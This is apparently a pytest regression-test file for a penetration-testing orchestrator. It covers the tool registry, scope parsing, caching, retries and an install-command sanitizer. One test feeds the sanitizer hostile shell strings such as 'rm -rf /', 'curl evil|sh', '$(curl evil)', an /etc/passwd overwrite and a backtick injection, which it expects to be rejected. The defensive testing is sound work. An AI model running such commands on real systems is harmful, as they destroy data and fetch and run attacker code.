"""Regression tests for the audit-round-1 fixes (batches A-C)."""
import ipaddress
import time

import httpx
import pytest

from nexus.config import Mode
from nexus.engine.executor import Executor
from nexus.enrich._http import RateLimiter, request_with_retry
from nexus.enrich.epss import _to_float
from nexus.report.risk import _label, build_attack_graph
from nexus.scope.scope import Scope, _parse_entry
from nexus.storage.db import Database
from nexus.tools.container import DockerRunner
from nexus.tools.discovery import sanitize_install, valid_binary
from nexus.tools.registry import Registry


# -- B1: recovery can see every tool (for_phase(None) = no filter) ----------
def test_registry_for_phase_none_returns_all():
    reg = Registry()
    all_tools = reg.for_phase(None)
    assert len(all_tools) == len(reg.all())
    described = reg.describe_for_phase("")
    assert "nmap" in described and "nuclei" in described


def test_registry_for_phase_filters_by_phase():
    reg = Registry()
    passive = {t.name for t in reg.for_phase("passive_recon")}
    assert "subfinder" in passive
    assert "hydra" not in passive  # exploitation-only tool


# -- B3: EPSS string -> float coercion --------------------------------------
def test_epss_to_float_coerces_strings():
    assert _to_float("0.0421") == pytest.approx(0.0421)
    assert _to_float(0.5) == 0.5
    assert _to_float(None) is None
    assert _to_float("not-a-number") is None


# -- B4: IPv6 / CIDR classified as host, not domain -------------------------
def test_scope_entry_classification():
    assert isinstance(_parse_entry("2001:db8::1"), ipaddress.IPv6Network)
    assert isinstance(_parse_entry("10.0.0.0/24"), ipaddress.IPv4Network)
    assert _parse_entry("example.com") == "example.com"


# -- B8: Mermaid label sanitization -----------------------------------------
def test_label_strips_breaking_chars():
    assert '"' not in _label('bad"title]with[brackets')
    assert "]" not in _label("x]y")
    assert _label("") == "?"


def test_attack_graph_has_no_unbalanced_quotes():
    assets = [{"type": "host", "value": "10.0.0.1"}]
    findings = [{"title": 'SQLi "quoted" [danger]', "evidence": "10.0.0.1", "cve_ids": []}]
    graph = build_attack_graph(assets, findings)
    # every label sits inside ["..."]; a stray quote in a label would make these odd
    for line in graph.splitlines():
        assert line.count('"') % 2 == 0


# -- A1: discovered-tool install sanitizer ----------------------------------
def test_sanitize_install_accepts_simple_package_installs():
    assert sanitize_install("apt-get install -y nmap") == "apt-get install -y nmap"
    assert sanitize_install("pip install httpx") == "pip install httpx"


def test_sanitize_install_accepts_extended_managers():
    for cmd in (
        "pipx install semgrep",
        "go install github.com/x/y@latest",
        "cargo install rustscan",
        "npm install -g wappalyzer",
    ):
        assert sanitize_install(cmd) == cmd


def test_sanitize_install_rejects_shell_metacharacters():
    assert sanitize_install("apt-get install -y nmap; rm -rf /") == ""
    assert sanitize_install("pip install x && curl evil|sh") == ""
    assert sanitize_install("echo pwned > /etc/passwd") == ""
    assert sanitize_install("$(curl evil)") == ""
    assert sanitize_install("git clone http://evil/x") == ""  # not an allowed manager
    assert sanitize_install("go install foo`whoami`") == ""


def test_valid_binary_requires_bare_token():
    assert valid_binary(["nmap", "{target}"])
    assert not valid_binary(["/bin/sh", "-c"])
    assert not valid_binary(["a;b"])
    assert not valid_binary([])


# -- C2: cache TTL ----------------------------------------------------------
def test_cache_get_respects_max_age(tmp_path):
    db = Database(tmp_path / "t.db")
    db.cache_put("k", "src", {"v": 1})
    assert db.cache_get("k") == {"v": 1}
    assert db.cache_get("k", max_age=3600) == {"v": 1}
    # force the stored row to look old
    db._exec("UPDATE enrichment_cache SET fetched_at=? WHERE key=?", (time.time() - 7200, "k"))
    assert db.cache_get("k", max_age=3600) is None
    assert db.cache_get("k") == {"v": 1}  # no max_age still hits
    db.close()


# -- C1: retry helper backs off then succeeds -------------------------------
def test_request_with_retry_retries_on_429(monkeypatch):
    calls = {"n": 0}

    def fake_request(method, url, **kwargs):
        calls["n"] += 1
        if calls["n"] == 1:
            return httpx.Response(429, request=httpx.Request(method, url))
        return httpx.Response(200, json={"ok": True}, request=httpx.Request(method, url))

    monkeypatch.setattr(httpx, "request", fake_request)
    monkeypatch.setattr(time, "sleep", lambda *_: None)
    resp = request_with_retry("GET", "https://example.test", limiter=RateLimiter(0))
    assert resp.status_code == 200 and calls["n"] == 2


def test_request_with_retry_raises_after_exhausting(monkeypatch):
    def always_429(method, url, **kwargs):
        return httpx.Response(429, request=httpx.Request(method, url))

    monkeypatch.setattr(httpx, "request", always_429)
    monkeypatch.setattr(time, "sleep", lambda *_: None)
    with pytest.raises(httpx.HTTPError):
        request_with_retry("GET", "https://example.test", retries=2, limiter=RateLimiter(0))


# -- B6: out-of-scope actions are flagged scope_denied (never retried) ------
def test_executor_flags_scope_denied(tmp_path):
    db = Database(tmp_path / "t.db")
    rid = db.create_run("scope", {"raw": ["10.0.0.0/24"]}, {}, {})
    scope = Scope.parse(Mode.SCOPE, ["10.0.0.0/24"])
    executor = Executor(db, Registry(), scope, DockerRunner(), rid)
    outcome = executor.run_tool("nmap", "9.9.9.9", "active_recon")
    assert outcome.ok is False
    assert outcome.scope_denied is True
    db.close()
